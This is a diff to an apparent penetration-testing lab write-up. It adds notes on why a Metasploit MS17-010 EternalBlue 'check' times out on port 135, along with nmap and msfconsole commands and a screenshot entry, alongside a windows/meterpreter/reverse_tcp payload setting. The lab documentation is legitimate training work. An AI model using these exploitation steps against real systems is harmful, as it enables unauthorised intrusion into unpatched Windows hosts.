@@ -292,6 +292,8 @@ set payload windows/meterpreter/reverse_tcp
 check
 ```
 
+**MSF MS17-010 `check` and “timed out … `:135`”:** The checker uses **SMB (`445`)** but may also probe **MS-RPC (`135`)**. A **timeout on `135`** means **Kali never got a timely TCP response on that port** — often **XP / host firewall rules**, **lab ACLs** between subnets, **intermittent loss**, or a **busy/slow target**. It is **not** fixed by changing **`LHOST`**. **Mitigations:** (1) **`nmap -Pn -p135,139,445 -sV "$RHOST"`** — if **`135` is filtered/closed**, expect RPC-dependent steps to be flaky. (2) In **`msfconsole`**, raise socket patience, e.g. **`setg ConnectTimeout 60`**, rerun **`check`**, then **`setg ConnectTimeout 10`** when done (restore a sane default). (3) Retry **`check`** or run **`use auxiliary/scanner/smb/smb_ms17_010`** with **`set VERBOSE true`**. (4) A **green “vulnerable”** line can still appear while a **red `135` timeout** logs beside it — **`run`** may succeed or fail for **other** reasons (arch, groom, patch); capture full **`run`** output. See [`100-002`](../Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png).
+
 **4 — Proof files (same pattern as other hosts).**
 
 ```text
@@ -306,6 +308,7 @@ C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
 | # | File | What it shows |
 |---|------|----------------|
 | **100-001** | [`100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png`](../Screenshots/100-001_enum4linux_null_session_denied_no_nbtstat_tm6_afrocha.png) | **`enum4linux -a 10.20.160.100`** — **no nbtstat reply**, **null** **`''`/`''`** session **not allowed** — standard anonymous SMB enum **blocked** on this run |
+| **100-002** | [`100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png`](../Screenshots/100-002_msf_ms17_010_check_135_timeout_still_vulnerable_tm6_afrocha.png) | **`ms17_010_eternalblue` → `check`** — **`[-] … timed out … :135`** alongside **`[+] … likely VULNERABLE`** / **target is vulnerable** (RPC path flaky; see MSF note above) |
 
 ---
 
